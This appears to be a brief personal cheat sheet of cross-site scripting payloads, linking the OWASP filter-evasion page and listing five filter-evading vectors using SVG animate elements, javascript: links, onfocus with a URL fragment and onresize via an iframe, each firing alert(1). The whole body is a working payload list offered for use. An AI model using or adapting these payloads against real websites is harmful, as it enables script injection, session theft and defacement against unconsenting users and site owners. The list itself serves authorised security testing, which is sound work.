# XSS

### Usefull links 
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

### Usefull payloads

```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
<svg><a><animate+attributeName=xlink:hrefbegin=0from=javascript:alert(1)to=&>
<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
<xss id=x tabindex=1 onfocus=alert(1)> url#x
<tag onresize=alert(1)> // <iframe src="url" onload="this.width = 100"> or use window.open and window.sizeTo
```